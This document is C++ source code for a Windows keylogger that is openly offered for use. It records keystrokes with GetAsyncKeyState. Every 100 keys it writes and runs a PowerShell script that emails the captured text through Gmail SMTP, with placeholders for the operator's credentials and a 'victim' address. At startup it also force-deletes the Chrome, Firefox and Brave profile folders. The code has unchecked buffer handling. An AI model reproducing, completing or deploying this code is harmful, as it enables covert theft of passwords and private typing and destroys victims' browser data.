#include<iostream>
#include<windows.h>
#include<cstdio>
#include<direct.h>
#include<Winuser.h>
using namespace std;

void (clearbravecache()){
     char path[256]="C:\\Users\\";
    strcat(path,getenv("USERNAME"));
    strcat(path,"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache\\");

    char removepath[256]="";
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath,path);
    system(removepath);
    //here we are creating new dir because in uper portion we are deleting it and 

     char createpath[256]="";
     strcat(createpath,"mkdir ");
     strcat(createpath,path);
     system(createpath);

}
 void(clearmozillacache()){
 char path[256]="C:\\Users\\";
    strcat(path,getenv("USERNAME"));
    strcat(path,"\\AppData\\Roaming\\Mozilla\\Firfox\\");

    char removepath[256]="";
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath,path);
    system(removepath);
     
    //here we are creating new dir because in uper portion we are deleting it and 

     char createpath[256]="";
     strcat(createpath,"mkdir ");
     strcat(createpath,path);
     system(createpath);
}
void(clearchromecache()){
    char path[256]="C:\\Users\\";
    strcat(path,getenv("USERNAME"));
    strcat(path,"\\AppData\\Local\\Google\\Chrome\\");

    char removepath[256]="";
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath,path);
    system(removepath);
     
     //here we are creating new dir because in uper portion we are deleting it and 
     char createpath[256]="";
     strcat(createpath,"mkdir ");
     strcat(createpath,path);
     system(createpath);
 

}
void(clearbrowsercache()){

   clearchromecache();
   clearmozillacache();
   clearbravecache(); 
}
void Save( char key,char* input ){

   if(key==8) strcat(input,"[BACKSPACE]");
else    if(key==13) strcat(input,"\n");
else   if(key==32) strcat(input," ");
else   if(key==VK_TAB) strcat(input,"[TAB]");
else   if(key==VK_SHIFT) strcat(input,"[SHIFT]");
else   if(key==VK_CONTROL) strcat(input,"[CONTROL]");
else   if(key==VK_ESCAPE) strcat(input,"[ESCAPE]");
else   if(key==VK_END) strcat(input,"[END]");
else   if(key==VK_LEFT) strcat(input,"[LEFT]");
else   if(key==VK_RIGHT) strcat(input,"[RIGHT]");
else   if(key==VK_UP) strcat(input,"[UP]");
else   if(key==VK_DOWN) strcat(input,"[DOWN]");
else   if(key==VK_RBUTTON) strcat(input,"[RBUTTON]");
else   if(key==VK_LBUTTON) strcat(input,"[LBUTTON]");
    
    
else
   {char temp[2]="";
     temp[0]=key;
     temp[1]='\0';
     strcat(input,temp);}
}
void SentMail(char* input)
{
FILE *fp=fopen("Keylogger.ps1","ab+");
fprintf(fp,"$Myemail=\"<your-email-id>\"\n"); //input your Email-id here
fprintf(fp,"$Mypass=\"<your-email-password>\"\n"); //Input your email pass here
fprintf(fp,"$SMTP=\"smtp.gmail.com\"\n");
fprintf(fp,"$to=\"<victim-email>\"\n"); // Input the victim Email-id here
fprintf(fp,"$Subject=\"KEYLOGGER\"\n");
fprintf(fp,"$Body=\"%s\"\n",input);
fprintf(fp,"$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n");
fprintf(fp,"$MyCredentials=New-object System.Management.Automation.PSCredential $Myemail,$SecurePassword\n");
fprintf(fp,"Send-MailMessage -To $To -From $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never\n");
fclose(fp);
char* syscall=(char*)malloc(100*sizeof(char));
syscall[0]='\0';
strcat(syscall,"powershell \"");
char* curpath;
curpath=_getcwd(NULL,0);
strcat(syscall,curpath);
strcat(syscall,"\\Keylogger.ps1\"");
system(syscall);
remove("Keylogger.ps1");


}

DWORD WINAPI ThreadFunc(void * data){
     char* threadinput=(char*)malloc(1100*sizeof(char));
     threadinput[0]='\0';
FILE *fp=fopen("Temp.txt","r");
while(fgets(threadinput,1100,fp)!=NULL);
printf("input:%s\n",threadinput);
fclose(fp);
remove("Temp.txt");
     SentMail(threadinput);
     free(threadinput);
}
int main(void){
//FreeConsole();//for running in the background
/* char name[64]="";
strcpy(name,getenv("username"));
cout<<name; */
clearbrowsercache();

int counter=0;
char* input =(char*)malloc(1100*sizeof(char));


input[0]='\0';

while(1)
{
     for(char i=8;i<=190;i++){
          if(GetAsyncKeyState(i) == -32767)//this means that whenever we press any key on keyboard it always return -32767 so we put in if and try to gather info
          {
           
               counter++;
              
               Save(i,input);
               cout<<i;
               if(counter==100)
               { FILE *fp=fopen("Temp.txt","ab+");
               fprintf(fp,"%s",input);
               fclose(fp);
                    
                     counter =0;
               SentMail(input);
               HANDLE thread =CreateThread(NULL,0,ThreadFunc,NULL,0,NULL);
             /*   FILE *fp=fopen("temp.txt","ab+");read and write
              fprintf(fp,"%s",input);
              fclose(fp); */
              free(input);
              input=(char*)malloc(100*sizeof(char));
              input[0]='\0';}
          }
     }
}
return 0;
}